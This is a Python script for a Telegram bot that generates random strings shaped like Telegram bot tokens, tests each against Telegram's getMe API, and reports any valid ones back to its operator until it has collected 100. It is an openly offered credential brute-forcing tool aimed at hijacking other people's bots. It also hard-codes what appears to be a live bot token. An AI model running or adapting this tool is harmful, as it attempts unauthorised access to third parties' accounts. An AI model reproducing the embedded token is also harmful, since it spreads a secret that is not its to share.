import requests
import random
import string
import time
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackContext

# Replace with your Telegram bot token
YOUR_BOT_TOKEN = '6909254063:AAGOX9b__AioR7L7Z_PPggpVhq6nAwGBV_8'

# List to store valid tokens
valid_tokens = []

def generate_realistic_token():
    bot_id = ''.join(random.choices(string.digits, k=random.randint(7, 10)))  # Generate a 7 to 10-digit bot ID
    secret = ''.join(random.choices(string.ascii_letters + string.digits + '_-', k=35))  # Generate a 35-character secret
    token = f"{bot_id}:{secret}"
    print(f"Generated token: {token}")
    return token

def check_token(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Token valid: {token}")
            return True
    except Exception as e:
        print(f"Error checking token: {token}, Error: {e}")
        return False
    print(f"Token invalid: {token}")
    return False

def start(update: Update, context: CallbackContext):
    user_id = update.message.chat_id
    context.bot.send_message(chat_id=user_id, text="Starting to find valid tokens. Please wait...")
    print("Start command received. Beginning token search...")
    find_tokens(context.bot, user_id)

def find_tokens(bot: Bot, user_id):
    count = 0
    while count < 100:
        token = generate_realistic_token()
        if check_token(token):
            valid_tokens.append(token)
            count += 1
            print(f"Valid tokens found: {count}")
            bot.send_message(chat_id=user_id, text=f"Found valid token: {token}\nTotal found: {count}")
        time.sleep(1)  # Add delay to avoid rate-limiting
    bot.send_message(chat_id=user_id, text=f"Finished finding 100 valid tokens. Tokens: {valid_tokens}")
    print(f"Finished finding 100 valid tokens. Tokens: {valid_tokens}")

def main():
    updater = Updater(token=YOUR_BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    start_handler = CommandHandler('start', start)
    dispatcher.add_handler(start_handler)

    print("Bot started. Awaiting commands...")
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
